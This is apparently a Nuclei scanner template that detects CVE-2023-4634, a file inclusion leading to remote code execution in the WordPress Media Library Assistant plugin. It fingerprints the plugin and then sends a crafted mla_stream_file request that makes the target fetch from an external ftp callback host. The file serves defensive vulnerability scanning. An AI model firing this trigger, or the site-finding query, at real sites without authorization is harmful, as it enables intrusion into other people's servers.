id: CVE-2023-4634

info:
  name: Media Library Assistant < 3.09 - Remote Code Execution/Local File Inclusion
  author: Pepitoh,ritikchaddha
  severity: critical
  description: |
    A vulnerability in the Wordpress Media-Library-Assistant plugins in version < 3.09 is vulnerable to a local file inclusion which leading to RCE on default Imagegick installation/configuration.
  remediation: Fixed in version 3.09
  reference:
    - https://patrowl.io/blog-wordpress-media-library-rce-cve-2023-4634/
    - https://fr.wordpress.org/plugins/media-library-assistant/advanced/
    - https://cve.report/CVE-2023-4634
  classification:
    cve-id: CVE-2023-4634
  metadata:
    verified: true
    max-request: 2
    publicwww-query: "wp-content/plugins/media-library-assistant"
  tags: cve,cve2023,wordpress,wp,wp-plugin,lfi,rce,media-library-assistant

http:
  - method: GET
    path:
      - "{{BaseURL}}/wp-content/plugins/media-library-assistant/readme.txt"
      - "{{BaseURL}}/wp-content/plugins/media-library-assistant/includes/mla-stream-image.php?mla_stream_file=ftp://{{interactsh-url}}/patrowl.svg"

    matchers-condition: and
    matchers:
      - type: word
        part: body_1
        words:
          - "Media Library Assistant"

      - type: word
        part: interactsh_protocol
        words:
          - "dns"
